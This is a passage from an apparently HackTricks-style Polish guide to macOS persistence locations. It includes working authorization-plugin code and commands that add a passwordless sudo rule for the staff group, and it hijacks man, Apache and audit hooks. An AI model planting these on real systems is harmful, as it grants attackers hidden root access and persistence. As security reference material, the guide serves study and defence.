Możesz utworzyć plugin autoryzacji, który będzie wykonywany podczas logowania użytkownika, aby utrzymać persistence. Więcej informacji na temat tworzenia takich pluginów znajdziesz w poprzednich writeupach (zachowaj ostrożność, ponieważ źle napisany plugin może zablokować Ci dostęp i konieczne będzie wyczyszczenie Maca z trybu recovery).<sup>[[29]](#references)[[30]](#references)</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Przenieś** pakiet do lokalizacji, z której zostanie załadowany:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Na koniec dodaj **regułę** ładowania tego Pluginu:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** poinformuje framework autoryzacji, że będzie musiał **wywołać zewnętrzny mechanizm autoryzacji**. Ponadto **`privileged`** sprawi, że zostanie on wykonany przez root.

Uruchom go za pomocą:
```bash
security authorize com.asdf.asdf
```
Następnie **staff group powinna mieć** dostęp przez sudo (odczytaj `/etc/sudoers`, aby to potwierdzić).

### Man.conf

Opis: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Musisz jednak być rootem, a użytkownik musi używać man
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/private/etc/man.conf`**
- Wymagany root
- **`/private/etc/man.conf`**: Za każdym razem, gdy używany jest man

#### Opis i exploit

Plik konfiguracyjny **`/private/etc/man.conf`** wskazuje binary/script używany podczas otwierania plików dokumentacji man. Można więc zmodyfikować ścieżkę do pliku wykonywalnego, aby za każdym razem, gdy użytkownik używa man do odczytania dokumentacji, uruchamiany był backdoor.<sup>[[31]](#references)</sup>

Na przykład ustaw w **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
A następnie utwórz `/tmp/view` jako:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
- Musisz jednak być rootem, a apache musi działać
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
- Httpd nie ma entitlements

#### Lokalizacja

- **`/etc/apache2/httpd.conf`**
- Wymagany root
- Wyzwalacz: po uruchomieniu Apache2

#### Opis i exploit

W pliku `/etc/apache2/httpd.conf` możesz wskazać załadowanie modułu, dodając wiersz taki jak:<sup>[[32]](#references)</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
W ten sposób skompilowany moduł zostanie załadowany przez Apache. Jedyne, co musisz zrobić, to **podpisać go ważnym certyfikatem Apple** albo **dodać nowy zaufany certyfikat** w systemie i **podpisać go** za jego pomocą.

Następnie, jeśli będzie to konieczne, aby upewnić się, że serwer zostanie uruchomiony, możesz wykonać:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Przykład kodu dla Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Opis: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Musisz jednak być rootem, auditd musi działać i musi spowodować warning
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/etc/security/audit_warn`**
- Wymagany root
- **Wyzwalacz**: Gdy auditd wykryje warning

#### Opis i exploit

Za każdym razem, gdy auditd wykryje warning, skrypt **`/etc/security/audit_warn`** zostanie **uruchomiony**. Możesz więc dodać do niego swój payload.<sup>[[33]](#references)</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Możesz wymusić ostrzeżenie za pomocą `sudo audit -n`.

### Elementy startowe

> [!CAUTION] > **Ta funkcja jest przestarzała, więc w tych katalogach nie powinno się nic znajdować.**

**StartupItem** to katalog, który powinien znajdować się w `/Library/StartupItems/` lub `/System/Library/StartupItems/`. Po utworzeniu tego katalogu musi on zawierać dwa określone pliki:

1. **Skrypt rc**: skrypt powłoki wykonywany podczas uruchamiania systemu.
2. **Plik plist**, konkretnie nazwany `StartupParameters.plist`, zawierający różne ustawienia konfiguracji.

Upewnij się, że zarówno skrypt rc, jak i plik `StartupParameters.plist` są prawidłowo umieszczone w katalogu **StartupItem**, aby proces uruchamiania systemu mógł je rozpoznać i wykorzystać.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Nie mogę znaleźć tego komponentu w moim macOS, dlatego więcej informacji znajdziesz w writeupie

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Wprowadzony przez Apple **emond** jest mechanizmem logowania, który wydaje się niedopracowany lub prawdopodobnie porzucony, jednak nadal pozostaje dostępny. Chociaż nie jest szczególnie przydatną funkcją dla administratora Maca, ta mało znana usługa mogłaby służyć threat actorom jako subtelna metoda persistence, prawdopodobnie niezauważona przez większość administratorów macOS.<sup>[[34]](#references)</sup>

Dla osób świadomych jego istnienia identyfikacja złośliwego użycia **emond** jest prosta. LaunchDaemon systemu dla tej usługi wyszukuje skrypty do wykonania w jednym katalogu. Można to sprawdzić za pomocą następującego polecenia:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Lokalizacja

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Wymagany root
- **Wyzwalacz**: Z XQuartz

#### Opis i exploit

XQuartz **nie jest już instalowany w macOS**, więc aby uzyskać więcej informacji, sprawdź writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Instalacja kext jest tak skomplikowana, nawet jako root, że nie jest uznawana za praktyczną technikę ucieczki z sandboxa ani persistence, chyba że masz exploit.

#### Lokalizacja

Aby zainstalować KEXT jako element uruchamiany przy starcie, należy go **zainstalować w jednej z następujących lokalizacji**:

- `/System/Library/Extensions`
- Pliki KEXT wbudowane w system operacyjny OS X.
- `/Library/Extensions`
- Pliki KEXT instalowane przez oprogramowanie firm trzecich

Możesz wyświetlić aktualnie załadowane pliki kext za pomocą:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Więcej informacji o [**kernel extensions znajdziesz w tej sekcji**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Opis: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Lokalizacja

- **`/usr/local/bin/amstoold`**
- Wymagany root

#### Opis i exploitation

Najwyraźniej `plist` z `/System/Library/LaunchAgents/com.apple.amstoold.plist` używał tego pliku binarnego, jednocześnie udostępniając usługę XPC... Problem polegał na tym, że plik binarny nie istniał, więc można było umieścić tam własny plik, a gdy usługa XPC została wywołana, wywołany zostałby również ten plik binarny.<sup>[[35]](#references)</sup>

Nie mogę już znaleźć tego w moim macOS.

### ~~xsanctl~~

Opis: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Lokalizacja

- **`/Library/Preferences/Xsan/.xsanrc`**
- Wymagany root
- **Trigger**: Gdy usługa jest uruchamiana (rzadko)

#### Opis i exploit

Najwyraźniej uruchamianie tego skryptu nie jest zbyt częste, a ja nie mogłem go nawet znaleźć w moim macOS, więc jeśli chcesz uzyskać więcej informacji, sprawdź opis.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **To nie działa we współczesnych wersjach MacOS**

Możliwe jest również umieszczenie tutaj **commands, które zostaną wykonane podczas uruchamiania.** Przykład zwykłego skryptu rc.common:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Techniki i narzędzia persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, rok Infostealera](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Poza dobrymi, starymi LaunchAgents - 1 - pliki startowe powłoki](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Poza dobrymi, starymi LaunchAgents - 18 - X11 i XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Poza dobrymi, starymi LaunchAgents - 21 - ponownie otwierane aplikacje](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Poza dobrymi, starymi LaunchAgents - 20 - preferencje Terminala](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Poza dobrymi, starymi LaunchAgents - 13 - wtyczki audio](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Wtyczki Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Poza dobrymi, starymi LaunchAgents - 12 - wtyczki QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Poza dobrymi, starymi LaunchAgents - 22 - LoginHook i LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Poza dobrymi, starymi LaunchAgents - 4 - zadania cron](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Poza dobrymi, starymi LaunchAgents - 2 - uruchamianie iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Poza dobrymi, starymi LaunchAgents - 7 - wtyczki xbar](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Poza dobrymi, starymi LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Poza dobrymi, starymi LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Poza dobrymi, starymi LaunchAgents - 3 - elementy logowania](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Poza dobrymi, starymi LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Poza dobrymi, starymi LaunchAgents - 24 - akcje folderów](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Akcje folderów jako persistence w macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Poza dobrymi, starymi LaunchAgents - 27 - skróty w Docku](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Poza dobrymi, starymi LaunchAgents - 17 - selektory kolorów](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Poza dobrymi, starymi LaunchAgents - 26 - wtyczki Finder Sync](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analiza persistence „Mac File Opener” (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Poza dobrymi, starymi LaunchAgents - 16 - wygaszacz ekranu](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Ochrona dostępu: wygaszacze ekranu jako persistence w macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Poza dobrymi, starymi LaunchAgents - 11 - importery Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Poza dobrymi, starymi LaunchAgents - 9 - panel preferencji](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Poza dobrymi, starymi LaunchAgents - 19 - skrypty okresowe](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Poza dobrymi, starymi LaunchAgents - 5 - moduły uwierzytelniania (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Poza dobrymi, starymi LaunchAgents - 28 - wtyczki autoryzacji](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Trwała kradzież poświadczeń za pomocą wtyczek autoryzacji (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Poza dobrymi, starymi LaunchAgents - 30 - plik konfiguracyjny man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Poza dobrymi, starymi LaunchAgents - 25 - moduły Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Poza dobrymi, starymi LaunchAgents - 31 - framework audytu BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Poza dobrymi, starymi LaunchAgents - 23 - emond, daemon monitorowania zdarzeń](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Poza dobrymi, starymi LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Poza dobrymi, starymi LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
{{#include ../banners/hacktricks-training.md}}
